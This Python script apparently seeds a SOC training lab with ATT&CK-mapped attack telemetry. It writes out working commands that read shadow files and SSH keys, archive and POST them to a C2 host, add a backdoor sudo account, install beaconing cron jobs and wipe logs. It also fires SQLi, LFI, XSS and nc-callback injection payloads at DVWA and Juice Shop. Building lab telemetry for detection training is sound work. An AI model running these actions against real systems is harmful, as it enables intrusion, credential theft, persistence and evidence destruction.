#!/usr/bin/env python3
"""Scenario runner.

  --parse    <file.yml>   print 'technique test' lines for seed.sh
  --requires <file.yml>   print the scenario's 'requires:' value (or nothing)
  <technique> <test> <victim>
                          perform the lab action for that technique

Exit codes matter: an unimplemented technique exits 2 rather than printing a
note and returning 0. A seeder that reports success while generating no
telemetry is worse than one that fails, because the analyst then hunts for
events that were never created.

Real host-side ATT&CK execution is Atomic Red Team's job (Windows victim). This
runner covers the network-observable actions, so the Linux-only default build
still produces genuine Suricata + auth.log telemetry.
"""
import subprocess
import sys
import time

C2 = "172.30.0.99"          # the c2 service in docker-compose.yml
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=5"]


def parse(path):
    import yaml
    with open(path) as fh:
        doc = yaml.safe_load(fh)
    for step in doc.get("chain", []):
        # `action:` (a named runner action) overrides `technique:` for lookup,
        # so several scenarios can reuse a real ATT&CK ID with distinct behaviour.
        key = step.get("action", step["technique"])
        print(f"{key} {step.get('test', 1)}")


def requires(path):
    import yaml
    with open(path) as fh:
        doc = yaml.safe_load(fh)
    req = doc.get("requires")
    if req:
        print(req)


def offset(path):
    import yaml
    with open(path) as fh:
        doc = yaml.safe_load(fh)
    off = doc.get("seed_time_offset")
    if off:
        print(off)


def sh(cmd, timeout=45):
    """Run one command; return True if it produced traffic we care about.

    Several of these are *expected* to exit non-zero (a refused SSH login, a
    scan). What matters is that the packets were sent, so a non-zero exit is
    only a failure when the command couldn't run at all.
    """
    try:
        # stdin=DEVNULL is REQUIRED: seed.sh drives us from a `while read … done
        # < <(runner --parse)` loop, and ssh (and other tools) otherwise inherit
        # and DRAIN that loop's stdin, so the loop hits EOF and every chain step
        # after the first is silently skipped. Severing stdin keeps the whole
        # chain running.
        subprocess.run(cmd, timeout=timeout, capture_output=True,
                       stdin=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        print(f"  [ERR ] missing tool: {cmd[0]}")
        return False
    except subprocess.TimeoutExpired:
        print(f"  [WARN] timed out: {' '.join(cmd[:3])}...")
        return True          # it ran; the traffic exists
    except Exception as exc:                                   # noqa: BLE001
        print(f"  [ERR ] {exc}")
        return False


SENTINEL = "__SEED_CHAIN_OK__"


def ssh_victim(victim, remote, timeout=45, retries=3):
    """Run a command chain on the victim as jdoe over SSH, RETRYING on a
    transport failure OR a mid-chain truncation.

    Two distinct failures both leave the seed silently short of telemetry:
      * The session never establishes — ssh returns 255 (sshpass 5 on auth) —
        so no command runs at all.
      * The session establishes and runs the FIRST few commands, then the
        connection drops mid-stream (observed under a busy seed: e.g. the
        credential-access chain logged `cat /etc/shadow` but not the later
        `useradd`/`bash_history` reads). The exit code is then the last command
        that DID run (often 0), so a returncode check alone can't see it.

    To catch both, we append a sentinel echo to the chain and require it back in
    stdout: its absence means the chain didn't finish. The old code ran the login
    once via sh() and returned True regardless, so either failure looked like
    success while seeding nothing. The remote commands are idempotent (re-reads,
    a useradd that harmlessly re-fails), so retrying the whole chain is safe.
    """
    full = f"{remote}\necho {SENTINEL}"
    cmd = ["sshpass", "-p", "Password123", "ssh", *SSH_OPTS, f"jdoe@{victim}", full]
    for attempt in range(1, retries + 1):
        try:
            # stdin=DEVNULL: ssh must NOT read our stdin — under seed.sh's
            # `while read … < <(runner --parse)` loop it would drain the loop's
            # input and skip every later chain step (see sh()). This is the real
            # cure for the "second technique never ran" flakiness.
            r = subprocess.run(cmd, timeout=timeout, capture_output=True,
                               stdin=subprocess.DEVNULL)
        except FileNotFoundError:
            print("  [ERR ] missing tool: sshpass/ssh")
            return False
        except subprocess.TimeoutExpired:
            # It ran long enough to have delivered the command; don't retry into
            # duplicate side effects.
            print(f"  [WARN] ssh timed out (attempt {attempt}/{retries})")
            return True
        out = (r.stdout or b"").decode("utf-8", "replace")
        if r.returncode in (5, 255):      # transport/auth failure — nothing ran
            print(f"  [WARN] ssh session to {victim} failed rc={r.returncode} "
                  f"(attempt {attempt}/{retries})")
            time.sleep(2)
            continue
        if SENTINEL not in out:           # session dropped mid-chain — incomplete
            print(f"  [WARN] ssh chain to {victim} truncated before completing "
                  f"(attempt {attempt}/{retries})")
            time.sleep(2)
            continue
        return True                       # whole chain was delivered
    print(f"  [ERR ] ssh to {victim} failed after {retries} attempts — no telemetry")
    return False


# --- technique implementations ----------------------------------------------
# Each returns True if the action was actually carried out.

def t1046_scan(victim):
    """Network service discovery — a SYN burst the port-scan rule keys on."""
    return sh(["nmap", "-sT", "-p1-1024", "--max-retries", "1", victim], timeout=120)


def t1110_bruteforce(victim):
    """Password guessing — a burst of failures, then the burst is the signal.

    One wrong password is not a brute force and won't look like one in auth.log
    or trip the threshold rule; eight in quick succession will.
    """
    ok = True
    for pw in ["123456", "password", "letmein", "admin", "qwerty",
               "root", "welcome", "Passw0rd"]:
        ok &= sh(["sshpass", "-p", pw, "ssh", *SSH_OPTS, f"jdoe@{victim}", "true"])
        time.sleep(1)
    return ok


def t1059_shell(victim):
    """Successful login as jdoe + on-host commands, including sudo (the foothold).

    jdoe is a NOPASSWD sudoer (the weak config), so the attacker escalates. Each
    sudo invocation lands in auth.log as process.name:sudo with COMMAND=... —
    real host-based execution evidence (auditd can't run in the container, so
    this is the Linux victim's execution telemetry)."""
    return ssh_victim(victim,
               "id; uname -a; cat /etc/passwd; "
               "sudo id; sudo cat /etc/shadow | head -3; sudo cat /etc/sudoers.d/weak")


def t1071_beacon(victim):
    """Repeated HTTP callbacks — regular intervals are what makes it a beacon."""
    ok = True
    for _ in range(6):
        ok &= sh(["curl", "-s", "--max-time", "5", f"http://{C2}/beacon"])
        time.sleep(3)
    return ok


def t1105_transfer(victim):
    """Second-stage download, pulled onto the victim so the victim's netns sees it."""
    return ssh_victim(victim,
               f"curl -s --max-time 5 -o /tmp/stage2 http://{C2}/stage2; ls -l /tmp/stage2")


def t1082_discovery(victim):
    """System information discovery, run through the foothold."""
    return ssh_victim(victim,
               "hostname; uname -a; ip a; ps aux | head -20; df -h")


def t1087_accounts(victim):
    """Account discovery, run through the foothold."""
    return ssh_victim(victim,
               "cat /etc/passwd; getent group sudo; last -n 20")


def t1053_cron(victim):
    """Scheduled-task persistence the analyst can find on the host."""
    return ssh_victim(victim,
               "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://%s/beacon') "
               "| crontab -" % C2)


def t1595_webscan(victim):
    """Active scanning — path probing at the DVWA web edge (proxy:81)."""
    base = "http://proxy:81"
    paths = ["/", "/login.php", "/setup.php", "/robots.txt", "/.git/config",
             "/admin/", "/phpmyadmin/", "/config/", "/.env", "/server-status",
             "/vulnerabilities/", "/wp-login.php"]
    ok = True
    for p in paths:
        ok &= sh(["curl", "-s", "-o", "/dev/null", "--max-time", "5", base + p])
        time.sleep(0.5)
    return ok


def t1190_webexploit(victim):
    """Exploit the public-facing app — SQLi / command injection / LFI / XSS at
    DVWA, through its WAF. CRS blocks them (403) and logs each to the audit log,
    which ships to lab-edge-modsecurity-*."""
    base = "http://proxy:81"
    attacks = [
        "/vulnerabilities/sqli/?id=1%27+OR+%271%27=%271&Submit=Submit",
        "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit",
        "/vulnerabilities/exec/?ip=127.0.0.1;cat+/etc/passwd&Submit=Submit",
        "/vulnerabilities/fi/?page=../../../../etc/passwd",
        "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E",
    ]
    ok = True
    for a in attacks:
        ok &= sh(["curl", "-s", "-o", "/dev/null", "--max-time", "8", base + a])
        time.sleep(1)
    return ok


# --- more Linux host techniques ---------------------------------------------

def t1048_exfil(victim):
    """Collection + exfiltration: archive sensitive files and POST them to the
    C2 over HTTP (visible as a flow to 172.30.0.99 and a sudo archive command).
    The victim-side curls carry --max-time so a slow C2 can't hang the SSH
    session past its timeout and swallow the whole action."""
    return ssh_victim(victim,
               "sudo tar czf /tmp/loot.tgz /etc/passwd /etc/shadow /etc/ssh 2>/dev/null; "
               f"curl -s -o /dev/null --max-time 10 -X POST --data-binary @/tmp/loot.tgz http://{C2}/exfil; "
               f"curl -s -o /tmp/s2 --max-time 10 http://{C2}/stage2")


def t1136_backdoor(victim):
    """Persistence: create a rogue, sudo-capable local account on the host
    (each sudo command lands in auth.log as process.name:sudo)."""
    return ssh_victim(victim,
               "sudo useradd -m -s /bin/bash svc_update 2>/dev/null; "
               "echo 'svc_update:Backd00r!' | sudo chpasswd; "
               "sudo usermod -aG sudo svc_update; sudo id svc_update")


def t1548_privesc(victim):
    """Privilege escalation: jdoe abuses the NOPASSWD sudo rule to spawn a root
    shell and act as root (each sudo lands in auth.log as process.name:sudo)."""
    return ssh_victim(victim,
               "sudo su root -c 'id; whoami; touch /root/.owned'; "
               "sudo bash -c 'id; echo pwned >> /root/.owned'; "
               "sudo -l")


def t1552_credaccess(victim):
    """Post-exploitation credential access: read the shadow file, SSH keys and
    shell history as root, hunting for reusable secrets."""
    return ssh_victim(victim,
               "sudo cat /etc/shadow; sudo cat /etc/gshadow; "
               "sudo find /home /root -name id_rsa -o -name authorized_keys 2>/dev/null; "
               "sudo cat /root/.bash_history 2>/dev/null; "
               "sudo cat /etc/ssh/ssh_host_rsa_key")


def t1053_beacon(victim):
    """The implanted cron already calls the C2 every minute; fire a few beacons
    now too so the scenario window has fresh, regular callbacks."""
    ok = True
    for _ in range(5):
        ok &= ssh_victim(victim, f"curl -s -o /dev/null --max-time 5 http://{C2}/beacon")
        time.sleep(3)
    return ok


def t1070_antiforensics(victim):
    """Defense evasion — indicator removal: having escalated, the attacker wipes
    the host's login/system logs and clears root's shell history to cover tracks.
    The key teaching point is that each destructive step runs THROUGH sudo, so the
    *attempt* is itself recorded in auth.log (process.name:sudo COMMAND=...) even
    as the target logs are truncated — the cover-up leaves its own fingerprint. The
    already-shipped events also survive in the SIEM, so the local wipe is moot."""
    return ssh_victim(victim,
               "sudo truncate -s 0 /var/log/wtmp; "
               "sudo truncate -s 0 /var/log/btmp; "
               "sudo bash -c 'cat /dev/null > /var/log/syslog'; "
               "sudo bash -c 'cat /dev/null > /root/.bash_history'; "
               "history -c 2>/dev/null || true")


def t1053_rootcron(victim):
    """Scheduled-job persistence: the attacker drops a ROOT cron job under
    /etc/cron.d that beacons to the C2 on a fixed interval, then triggers a few
    callbacks now so the investigation window has fresh, regular C2 flows. The
    cron.d write goes through sudo (COMMAND=... in auth.log — the persistence
    IOC); the beacons run on the victim so suricata-victim sees the flows."""
    ok = ssh_victim(victim,
             "sudo bash -c \"printf '*/5 * * * * root curl -s http://%s/beacon\\n' "
             "> /etc/cron.d/sys-refresh\"; "
             "sudo chmod 0644 /etc/cron.d/sys-refresh; "
             "sudo ls -l /etc/cron.d/sys-refresh" % C2)
    for _ in range(5):
        ok &= ssh_victim(victim, f"curl -s -o /dev/null --max-time 5 http://{C2}/beacon")
        time.sleep(2)
    return ok


# --- web attack classes (through the WAF at proxy:81 -> DVWA) ----------------

def _web(paths, pause=1):
    ok = True
    for p in paths:
        ok &= sh(["curl", "-s", "-o", "/dev/null", "--max-time", "8", "http://proxy:81" + p])
        time.sleep(pause)
    return ok


def t1190_sqli(victim):
    """SQL injection (union + boolean/blind) against DVWA."""
    return _web([
        "/vulnerabilities/sqli/?id=1%27+OR+%271%27=%271&Submit=Submit",
        "/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit",
        "/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP(5)--+-&Submit=Submit",
    ])


def t1083_lfi(victim):
    """Local file inclusion / path traversal to read system files."""
    return _web([
        "/vulnerabilities/fi/?page=../../../../etc/passwd",
        "/vulnerabilities/fi/?page=....//....//....//etc/passwd",
        "/vulnerabilities/fi/?page=%2Fetc%2Fpasswd%00",
    ])


def t1059_cmdinj(victim):
    """OS command injection, including an attempted callback to the C2."""
    return _web([
        "/vulnerabilities/exec/?ip=127.0.0.1;cat+/etc/passwd&Submit=Submit",
        "/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit",
        f"/vulnerabilities/exec/?ip=127.0.0.1%7Cnc+{C2}+4444&Submit=Submit",
    ])


def t1189_xss(victim):
    """Reflected / stored / DOM cross-site scripting probes."""
    return _web([
        "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "/vulnerabilities/xss_s/?txtName=%3Cscript%3Edocument.cookie%3C%2Fscript%3E&mtxMessage=x&btnSign=Sign",
        "/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
    ])


def t1190_juiceshop(victim):
    """Attack the OWASP Juice Shop app through ITS WAF (proxy:80 -> waf -> juiceshop),
    as opposed to the DVWA edge (proxy:81) the other web scenarios hit. Fires the
    classic Juice Shop auth-bypass plus UNION-based search SQLi and an XSS probe at
    the REST API. CRS blocks the injections and logs each to the Juice Shop WAF audit
    log — log.file.path:/logs/modsec/audit.log, distinct from the DVWA WAF's
    audit-dvwa.log — with the attacker's real source IP."""
    base = "http://proxy"          # port 80 -> waf -> juiceshop:3000
    ok = True
    # SQLi auth bypass on the login API (JSON body)
    ok &= sh(["curl", "-s", "-o", "/dev/null", "--max-time", "8", "-X", "POST",
              "-H", "Content-Type: application/json",
              "--data", '{"email":"\' OR 1=1--","password":"x"}',
              base + "/rest/user/login"])
    time.sleep(1)
    # UNION-based SQLi in the product-search API (query string — CRS 942xxx)
    for q in [
        "/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--",
        "/rest/products/search?q=%27%20OR%201=1--",
        "/rest/products/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "/ftp/package.json.bak%2500.md",
    ]:
        ok &= sh(["curl", "-s", "-o", "/dev/null", "--max-time", "8", base + q])
        time.sleep(1)
    return ok


def t1595_scanner(victim):
    """Automated web scanner — a broad sweep of sensitive paths + attack probes."""
    return _web([
        "/", "/admin/", "/backup/", "/.git/config", "/.env", "/phpinfo.php",
        "/config.php.bak", "/wp-admin/", "/server-status", "/shell.php",
        "/?q=%3Cscript%3Ex%3C%2Fscript%3E", "/?id=1%27--", "/?file=..%2F..%2Fetc%2Fpasswd",
    ], pause=0.4)


ACTIONS = {
    "T1046":     t1046_scan,
    "T1110.001": t1110_bruteforce,
    "T1059.004": t1059_shell,
    "T1071.001": t1071_beacon,
    "T1105":     t1105_transfer,
    "T1082":     t1082_discovery,
    "T1087.001": t1087_accounts,
    "T1053.003": t1053_cron,
    "T1595.002": t1595_webscan,
    "T1190":     t1190_webexploit,
    "T1048.003": t1048_exfil,
    "T1136.001": t1136_backdoor,
    "T1548.003": t1548_privesc,
    "T1552.001": t1552_credaccess,
    # Named actions, selected per-scenario via the chain step's `action:` field
    # so several scenarios can reuse the same real ATT&CK ID with different
    # concrete behaviour.
    "cron_beacon": t1053_beacon,
    "linux_antiforensics": t1070_antiforensics,
    "cron_persist":        t1053_rootcron,
    "web_sqli":    t1190_sqli,
    "web_lfi":     t1083_lfi,
    "web_cmdinj":  t1059_cmdinj,
    "web_xss":     t1189_xss,
    "web_scan":    t1595_scanner,
    "web_juiceshop": t1190_juiceshop,
}


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    if sys.argv[1] == "--parse":
        parse(sys.argv[2])
        return 0
    if sys.argv[1] == "--requires":
        requires(sys.argv[2])
        return 0
    if sys.argv[1] == "--offset":
        offset(sys.argv[2])
        return 0

    tech, _test, victim = sys.argv[1], sys.argv[2], sys.argv[3]
    action = ACTIONS.get(tech)
    if action is None:
        print(f"  [ERR ] no lab emulation for {tech}")
        print(f"         Implement it in attacks/runner.py, or the scenario will")
        print(f"         promise telemetry that never gets created.")
        return 2
    return 0 if action(victim) else 1


if __name__ == "__main__":
    sys.exit(main())
